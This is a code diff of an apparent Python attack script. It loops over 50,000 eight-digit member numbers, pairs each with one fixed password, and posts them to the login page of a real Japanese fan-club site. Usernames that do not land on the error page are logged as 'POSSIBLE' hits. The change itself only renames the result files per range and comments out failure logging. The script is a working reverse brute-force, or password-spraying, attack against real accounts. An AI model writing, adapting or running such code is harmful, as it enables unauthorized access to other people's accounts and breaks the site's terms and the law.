@@ -9,7 +9,6 @@ USERNAME_LB = '01800000'
 USERNAME_UB = '01850000'
 USERNAME_LEN = 8
 PASSWORD = '9789'
-RESULT_PATH = 'result.txt'
 
 URL = 'https://www.fc-member.johnnys-net.jp/login.php'
 HEADERS = {
@@ -37,6 +36,7 @@ PAYLOAD = {
 WRONGURL = 'https://www.fc-member.johnnys-net.jp/error_member.html'
 
 def test_between(lb, ub):
+    RESULT_PATH = 'result_sta%d_end%d.txt' % (lb, ub)
     for uname in range(lb, ub + 1):
         username = str(uname).zfill(USERNAME_LEN)
         PAYLOAD['customer_no'] = username
@@ -47,8 +47,8 @@ def test_between(lb, ub):
                 f.write('POSSIBLE: %s at URL %s\n' % (username, r.url))
         else:
             print('FAIL: %s at URL %s\n' % (username, r.url))
-            with open(RESULT_PATH, 'a+') as f:
-                f.write('FAIL: %s at URL %s\n' % (username, r.url))
+            # with open(RESULT_PATH, 'a+') as f:
+            #     f.write('FAIL: %s at URL %s\n' % (username, r.url))
 
 ulb = int(USERNAME_LB)
 uub = int(USERNAME_UB)
